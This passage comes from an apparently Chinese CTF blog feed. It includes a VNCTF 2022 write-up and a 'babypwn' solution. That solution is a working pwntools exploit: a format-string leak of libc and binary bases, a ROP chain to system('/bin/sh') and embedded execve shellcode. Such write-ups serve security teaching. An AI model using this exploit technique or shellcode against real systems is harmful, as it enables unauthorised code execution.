class="line">}</span><br><span class="line">backup := <span class="hljs-keyword">string</span>(b)</span><br><span class="line">s := handle(b)</span><br><span class="line"><span class="hljs-comment">//for _, c := range s {</span></span><br><span class="line"><span class="hljs-comment">//fmt.Printf("%02x ", c)</span></span><br><span class="line"><span class="hljs-comment">//}</span></span><br><span class="line">res := Sha256(<span class="hljs-keyword">string</span>(s))</span><br><span class="line"><span class="hljs-keyword">if</span> res == shaRes {</span><br><span class="line">fmt.Println(backup)</span><br><span class="line"><span class="hljs-keyword">break</span></span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//break</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><p>格式化字符串加栈溢出，泄露libc_base然后构造rop</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># %%</span></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = ELF(<span class="hljs-string">"./babypwn_patched"</span>)</span><br><span class="line">libc = ELF(<span class="hljs-string">"./libc.so.6"</span>)</span><br><span class="line">ld = ELF(<span class="hljs-string">"./ld-2.31.so"</span>)</span><br><span class="line"></span><br><span class="line">context.binary = binary</span><br><span class="line">context.os = <span class="hljs-string">'linux'</span></span><br><span class="line">context.arch = context.binary.arch</span><br><span class="line"><span class="hljs-comment"># context.terminal = ['alacritty', '-e']</span></span><br><span class="line">context.terminal = [<span class="hljs-string">'wt.exe'</span>, <span class="hljs-string">'wsl'</span>, <span class="hljs-string">'--'</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="hljs-literal">False</span></span><br><span class="line"><span class="hljs-keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="hljs-string">'debug'</span></span><br><span class="line">    p = process([binary.path])</span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">    p = remote(<span class="hljs-string">"be.ax"</span>, <span class="hljs-number">31801</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbgaddr</span>(<span class="hljs-params">addr, PIE=<span class="hljs-literal">False</span></span>):</span>  <span class="hljs-comment"># PIE enabled</span></span><br><span class="line">    <span class="hljs-keyword">if</span> local:</span><br><span class="line">        <span class="hljs-keyword">if</span> PIE:</span><br><span class="line">            text_base = <span class="hljs-built_in">int</span>(</span><br><span class="line">                os.popen(<span class="hljs-string">"pmap {}| awk '{{print $1}}'"</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)</span><br><span class="line">            log.info(<span class="hljs-string">f'b *<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(text_base + addr)}</span>\n'</span>)</span><br><span class="line">            gdb.attach(p, <span class="hljs-string">f'b *<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(text_base + addr)}</span>'</span>)</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            gdb.attach(p, <span class="hljs-string">f'b *<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(addr)}</span>'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span>(<span class="hljs-params">func=<span class="hljs-string">''</span></span>):</span></span><br><span class="line">    <span class="hljs-keyword">if</span> local:</span><br><span class="line">        gdb.attach(p, func)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># dbgaddr(0x6AA1,PIE=True)</span></span><br><span class="line"><span class="hljs-comment"># dbg("main")</span></span><br><span class="line"></span><br><span class="line">s = <span class="hljs-keyword">lambda</span> <span class="hljs-built_in">str</span>: p.send(<span class="hljs-built_in">str</span>)</span><br><span class="line">sl = <span class="hljs-keyword">lambda</span> <span class="hljs-built_in">str</span>: p.sendline(<span class="hljs-built_in">str</span>)</span><br><span class="line">sa = <span class="hljs-keyword">lambda</span> delims, <span class="hljs-built_in">str</span>: p.sendafter(delims, <span class="hljs-built_in">str</span>)</span><br><span class="line">sla = <span class="hljs-keyword">lambda</span> delims, <span class="hljs-built_in">str</span>: p.sendlineafter(delims, <span class="hljs-built_in">str</span>)</span><br><span class="line">r = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>: p.recv(numb)</span><br><span class="line">rl = <span class="hljs-keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>: p.recvuntil(delims, drop)</span><br><span class="line">uu32 = <span class="hljs-keyword">lambda</span> data: u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b'\x00'</span>))</span><br><span class="line">uu64 = <span class="hljs-keyword">lambda</span> data: u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b'\x00'</span>))</span><br><span class="line">li = <span class="hljs-keyword">lambda</span> <span class="hljs-built_in">str</span>, data: log.success(<span class="hljs-built_in">str</span> + <span class="hljs-string">'========&gt;'</span> + <span class="hljs-built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># %%</span></span><br><span class="line">sh_x86_18 = <span class="hljs-string">b"\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span></span><br><span class="line">sh_x86_20 = <span class="hljs-string">b"\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span></span><br><span class="line">sh_x64_21 = <span class="hljs-string">b"\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"</span></span><br><span class="line"><span class="hljs-comment"># https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># %%</span></span><br><span class="line">ru(<span class="hljs-string">b"?\n"</span>)</span><br><span class="line">sl(<span class="hljs-string">b"%2$p.%9$p"</span>)</span><br><span class="line">ru(<span class="hljs-string">b"Hi, "</span>)</span><br><span class="line">tmp=rl()[:-<span class="hljs-number">1</span>].split(<span class="hljs-string">b"."</span>)</span><br><span class="line">libcbase=<span class="hljs-built_in">int</span>(tmp[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>:],<span class="hljs-number">16</span>)+<span class="hljs-number">5184</span></span><br><span class="line">li(<span class="hljs-string">"libcbase"</span>,libcbase)</span><br><span class="line">binbase=<span class="hljs-built_in">int</span>(tmp[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>:],<span class="hljs-number">16</span>)-<span class="hljs-number">106942</span></span><br><span class="line">li(<span class="hljs-string">"binbase"</span>,binbase)</span><br><span class="line"><span class="hljs-comment"># %%</span></span><br><span class="line">system=libcbase+libc.sym.system</span><br><span class="line">li(<span class="hljs-string">"system"</span>,system)</span><br><span class="line">bin_sh=libcbase+libc.search(<span class="hljs-string">b"/bin/sh"</span>).__next__()</span><br><span class="line">li(<span class="hljs-string">"bin_sh"</span>,bin_sh)</span><br><span class="line">pop_rdi=binbase+<span class="hljs-number">0x00000000000051d1</span></span><br><span class="line">li(<span class="hljs-string">"pop_rdi"</span>,pop_rdi)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># pop_rdi=libcbase+0x0000000000023b6a</span></span><br><span class="line">payload=<span class="hljs-string">b"a"</span>*<span class="hljs-number">0x60</span>+p64(binbase+<span class="hljs-number">0x0000000000015631</span>)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="hljs-comment"># %%</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p>这里做麻烦了一些，可以使用libc里的gadgets，就可以不用泄露binary base。</p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF 2022 wp</title>
      <link href="/2022/02/18/VNCTF-2022-wp/"/>
      <url>/2022/02/18/VNCTF-2022-wp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>题目质量还不错，断断续续做了一天，最后第9也还可以。</p><span id="more"></span><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h3><p>填问卷</p><h3 id="仔细找找"><a href="#仔细找找" class="headerlink" title="仔细找找"></a>仔细找找</h3><p>图片转成黑白，可以直接看到flag</p><p><img src="/2022/02/18/VNCTF-2022-wp/flag.png" alt="1"></p><p><code>vnctf{34aE@w}</code></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="GameV4-0"><a href="#GameV4-0" class="headerlink" title="GameV4.0"></a>GameV4.0</h3><p>源码data里找到flag</p><p><img src="/2022/02/18/VNCTF-2022-wp/game.png" alt="2"></p><p>解一下base64得到flag</p><p><img src="/2022/02/18/VNCTF-2022-wp/game_flag.png" alt="3"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ezmath"><a href="#ezmath" class="headerlink" title="ezmath"></a>ezmath</h3><p>满足<br>$$<br>2^n-1\mod15=0<br>$$<br>只需要满足 n=4x<br>$$<br>2^{4x}-1\mod15=0<br>$$</p><p>$$<br>16^x-1\mod15=0<br>$$</p><p>$$<br>(15+1)^x-1\mod15=0<br>$$</p><p>$$<br>\Sigma_{k=0}^xC_x^k15^k-1\mod15=0<br>$$</p><p>$$<br>\Sigma_{k=1}^xC_x^k15^k\mod15=0<br>$$</p><p>满足要求，解析出来数字直接乘4就可以了</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> pwnlib.util.iters <span class="hljs-keyword">import</span> mbruteforce</span><br><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"><span class="hljs-keyword">import</span> hashlib</span><br><span class="line">p=remote(<span class="hljs-string">"node4.buuoj.cn"</span>,<span class="hljs-number">26203</span>)</span><br><span class="line"></span><br><span class="line">s=p.recvline().decode()</span><br><span class="line">res=re.findall(<span class="hljs-string">r'XXXX\+(.*)\) == (.*)\n'</span>,s)[<span class="hljs-number">0</span>]</span><br><span class="line">part1=res[<span class="hljs-number">0</span>]</span><br><span class="line">part2=res[<span class="hljs-number">1</span>]</span><br><span class="line"></span><br><span class="line">charset = string.ascii_letters+string.digits</span><br><span class="line">proof = mbruteforce(<span class="hljs-keyword">lambda</span> x: hashlib.sha256((x+part1).encode()).hexdigest() ==</span><br><span class="line">part2, charset, <span class="hljs-number">4</span>, method=<span class="hljs-string">'fixed'</span>)</span><br><span class="line">p.recvuntil(<span class="hljs-string">b":"</span>)</span><br><span class="line">p.sendline(proof.encode())</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">777</span>):</span><br><span class="line">    p.recvuntil(<span class="hljs-string">b"the "</span>)</span><br><span class="line">    n=p.recvuntil(<span class="hljs-string">b"t"</span>)[:-<span class="hljs-number">1</span>]</span><br><span class="line">    <span class="hljs-comment"># print(n)</span></span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>*<span class="hljs-built_in">int</span>(n)).encode())</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span>(p.recv())</span><br></pre></td></tr></tbody></table></figure><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="BabyMaze"><a href="#BabyMaze" class="headerlink" title="BabyMaze"></a>BabyMaze</h3><p>pyc文件，前面加花，直接反编译会卡死，去花可以反编译，但是程序不难，直接看也能很容易看懂</p><figure class="highlight tap hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">0       LOAD_CONST              1: 1</span><br><span class="line">               <span class="hljs-number"> 2 </span>      STORE_FAST              0: x</span><br><span class="line">               <span class="hljs-number"> 4 </span>      LOAD_CONST              1: 1</span><br><span class="line">               <span class="hljs-number"> 6 </span>      STORE_FAST              1: y</span><br><span class="line">               <span class="hljs-number"> 8 </span>      LOAD_GLOBAL             0: input</span><br><span class="line">               <span class="hljs-number"> 10 </span>     CALL_FUNCTION           0</span><br><span class="line">               <span class="hljs-number"> 12 </span>     STORE_FAST              2: step</span><br><span class="line">               <span class="hljs-number"> 14 </span>     LOAD_GLOBAL             1: range</span><br><span class="line">               <span class="hljs-number"> 16 </span>     LOAD_GLOBAL             2: len</span><br><span class="line">               <span class="hljs-number"> 18 </span>     LOAD_FAST               2: step</span><br><span class="line">               <span class="hljs-number"> 20 </span>     CALL_FUNCTION           1</span><br><span class="line">               <span class="hljs-number"> 22 </span>     CALL_FUNCTION           1</span><br><span class="line">               <span class="hljs-number"> 24 </span>     GET_ITER                </span><br><span class="line">               <span class="hljs-number"> 26 </span>     FOR_ITER               <span class="hljs-number"> 142 </span>(to 170)</span><br><span class="line">               <span class="hljs-number"> 28 </span>     STORE_FAST              3: i</span><br><span class="line">               <span class="hljs-number"> 30 </span>     LOAD_FAST               2: step</span><br><span class="line">               <span class="hljs-number"> 32 </span>     LOAD_FAST               3: i</span><br><span class="line">               <span class="hljs-number"> 34 </span>     BINARY_SUBSCR           </span><br><span class="line">               <span class="hljs-number"> 36 </span>     LOAD_CONST              2: 'w'</span><br><span class="line">               <span class="hljs-number"> 38 </span>     COMPARE_OP             <span class="hljs-number"> 2 </span>(==)</span><br><span class="line">               <span class="hljs-number"> 40 </span>     POP_JUMP_IF_FALSE       52</span><br><span class="line">               <span class="hljs-number"> 42 </span>     LOAD_FAST               0: x</span><br><span class="line">               <span class="hljs-number"> 44 </span>     LOAD_CONST              1: 1</span><br><span class="line">               <span class="hljs-number"> 46 </span>     INPLACE_SUBTRACT        </span><br><span class="line">               <span class="hljs-number"> 48 </span>     STORE_FAST              0: x</span><br><span class="line">               <span class="hljs-number"> 50 </span>     JUMP_FORWARD           <span class="hljs-number"> 72 </span>(to 124)</span><br><span class="line">               <span class="hljs-number"> 52 </span>     LOAD_FAST               2: step</span><br><span class="line">               <span class="hljs-number"> 54 </span>     LOAD_FAST               3: i</span><br><span class="line">               <span class="hljs-number"> 56 </span>     BINARY_SUBSCR           </span><br><span class="line">               <span class="hljs-number"> 58 </span>     LOAD_CONST              3: 's'</span><br><span class="line">               <span class="hljs-number"> 60 </span>     COMPARE_OP             <span class="hljs-number"> 2 </span>(==)</span><br><span class="line">               <span class="hljs-number"> 62 </span>     POP_JUMP_IF_FALSE       74</span><br><span class="line">               <span class="hljs-number"> 64 </span>     LOAD_FAST               0: x</span><br><span class="line">               <span class="hljs-number"> 66 </span>     LOAD_CONST              1: 1</span><br><span class="line">               <span class="hljs-number"> 68 </span>     INPLACE_ADD             </span><br><span class="line">               <span class="hljs-number"> 70 </span>     STORE_FAST              0: x</span><br><span class="line">               <span class="hljs-number"> 72 </span>     JUMP_FORWARD           <span class="hljs-number"> 50 </span>(to 124)</span><br><span class="line">               <span class="hljs-number"> 74 </span>     LOAD_FAST               2: step</span><br><span class="line">               <span class="hljs-number"> 76 </span>     LOAD_FAST               3: i</span><br><span class="line">               <span class="hljs-number"> 78 </span>     BINARY_SUBSCR           </span><br><span class="line">               <span class="hljs-number"> 80 </span>     LOAD_CONST              4: 'a'</span><br><span class="line">               <span class="hljs-number"> 82 </span>     COMPARE_OP             <span class="hljs-number"> 2 </span>(==)</span><br><span class="line">               <span class="hljs-number"> 84 </span>     POP_JUMP_IF_FALSE       96</span><br><span class="line">               <span class="hljs-number"> 86 </span>     LOAD_FAST               1: y</span><br><span class="line">               <span class="hljs-number"> 88 </span>     LOAD_CONST              1: 1</span><br><span class="line">               <span class="hljs-number"> 90 </span>     INPLACE_SUBTRACT        </span><br><span class="line">               <span class="hljs-number"> 92 </span>     STORE_FAST              1: y</span><br><span class="line">               <span class="hljs-number"> 94 </span>     JUMP_FORWARD           <span class="hljs-number"> 28 </span>(to 124)</span><br><span class="line">               <span class="hljs-number"> 96 </span>     LOAD_FAST               2: step</span><br><span class="line">               <span class="hljs-number"> 98 </span>     LOAD_FAST               3: i</span><br><span class="line">               <span class="hljs-number"> 100 </span>    BINARY_SUBSCR           </span><br><span class="line">               <span class="hljs-number"> 102 </span>    LOAD_CONST              5: 'd'</span><br><span class="line">               <span class="hljs-number"> 104 </span>    COMPARE_OP             <span class="hljs-number"> 2 </span>(==)</span><br><span class="line">               <span class="hljs-number"> 106 </span>    POP_JUMP_IF_FALSE       118</span><br><span class="line">               <span class="hljs-number"> 108 </span>    LOAD_FAST               1: y</span><br><span class="line">               <span class="hljs-number"> 110 </span>    LOAD_CONST              1: 1</span><br><span class="line">               <span class="hljs-number"> 112 </span>    INPLACE_ADD             </span><br><span class="line">               <span class="hljs-number"> 114 </span>    STORE_FAST              1: y</span><br><span class="line">               <span class="hljs-number"> 116 </span>    JUMP_FORWARD           <span class="hljs-number"> 6 </span>(to 124)</span><br><span class="line">               <span class="hljs-number"> 118 </span>    POP_TOP                 </span><br><span class="line">               <span class="hljs-number"> 120 </span>    LOAD_CONST              6: False</span><br><span class="line">               <span class="hljs-number"> 122 </span>    RETURN_VALUE            </span><br><span class="line">               <span class="hljs-number"> 124 </span>    LOAD_GLOBAL             3: _map</span><br><span class="line">               <span class="hljs-number"> 126 </span>    LOAD_FAST               0: x</span><br><span class="line">               <span class="hljs-number"> 128 </span>    BINARY_SUBSCR           </span><br><span class="line">               <span class="hljs-number"> 130 </span>    LOAD_FAST               1: y</span><br><span class="line">               <span class="hljs-number"> 132 </span>    BINARY_SUBSCR           </span><br><span class="line">               <span class="hljs-number"> 134 </span>    LOAD_CONST              1: 1</span><br><span class="line">               <span class="hljs-number"> 136 </span>    COMPARE_OP             <span class="hljs-number"> 2 </span>(==)</span><br><span class="line">               <span class="hljs-number"> 138 </span>    POP_JUMP_IF_FALSE       146</span><br><span class="line">               <span class="hljs-number"> 140 </span>    POP_TOP                 </span><br><span class="line">               <span class="hljs-number"> 142 </span>    LOAD_CONST              6: False</span><br><span class="line">               <span class="hljs-number"> 144 </span>    RETURN_VALUE            </span><br><span class="line">               <span class="hljs-number"> 146 </span>    LOAD_FAST               0: x</span><br><span class="line">               <span class="hljs-number"> 148 </span>    LOAD_CONST              7: 29</span><br><span class="line">               <span class="hljs-number"> 150 </span>    COMPARE_OP             <span class="hljs-number"> 2 </span>(==)</span><br><span class="line">               <span class="hljs-number"> 152 </span>    POP_JUMP_IF_FALSE       26</span><br><span class="line">               <span class="hljs-number"> 154 </span>    LOAD_FAST               1: y</span><br><span class="line">               <span class="hljs-number"> 156 </span>    LOAD_CONST              7: 29</span><br><span class="line">               <span class="hljs-number"> 158 </span>    COMPARE_OP             <span class="hljs-number"> 2 </span>(==)</span><br><span class="line">               <span class="hljs-number"> 160 </span>    POP_JUMP_IF_FALSE       26</span><br><span class="line">               <span class="hljs-number"> 162 </span>    POP_TOP                 </span><br><span class="line">               <span class="hljs-number"> 164 </span>    LOAD_CONST              8: True</span><br><span class="line">               <span class="hljs-number"> 166 </span>    RETURN_VALUE            </span><br><span class="line">               <span class="hljs-number"> 168 </span>    JUMP_ABSOLUTE           26</span><br><span class="line">               <span class="hljs-number"> 170 </span>    LOAD_CONST              0: None</span><br><span class="line">               <span class="hljs-number"> 172 </span>    RETURN_VALUE            </span><br></pre></td></tr></tbody></table></figure><p><code>wasd</code>移动，导出地图，发现地图很小没必要写深搜，走一遍就行了</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ans=<span class="hljs-string">"ssssddssaassddddwwwwddwwddddddwwddddddssddwwddddddddssssaawwaassaassaassddssaassaawwwwwwaaaaaaaassaassddddwwddssddssssaassddssssaaaaaawwddwwaawwwwaassssssssssssddddssddssddddddddwwaaaaaawwwwddssddwwwwwwwwddssddssssssssddddss"</span></span><br><span class="line"><span class="hljs-keyword">import</span> hashlib</span><br><span class="line">m=hashlib.md5()</span><br><span class="line">m.update(ans.encode())</span><br><span class="line"><span class="hljs-built_in">print</span>(m.hexdigest())</span><br></pre></td></tr></tbody></table></figure><h3 id="cm狗"><a href="#cm狗" class="headerlink" title="cm狗"></a>cm狗</h3><p>vm，简单解析一下指令看看程序是不是很复杂</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">opcodes = [<span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000057</span>, <span class="hljs-number">0x00000062</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000065</span>, <span class="hljs-number">0x00000062</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000006C</span>, <span class="hljs-number">0x00000062</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000063</span>, <span class="hljs-number">0x00000062</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000006F</span>, <span class="hljs-number">0x00000062</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000006D</span>, <span class="hljs-number">0x00000062</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000065</span>, <span class="hljs-number">0x00000062</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000020</span>, <span class="hljs-number">0x00000062</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000074</span>, <span class="hljs-number">0x00000062</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000006F</span>, <span class="hljs-number">0x00000062</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000020</span>, <span class="hljs-number">0x00000062</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000056</span>, <span class="hljs-number">0x00000062</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000004E</span>, <span 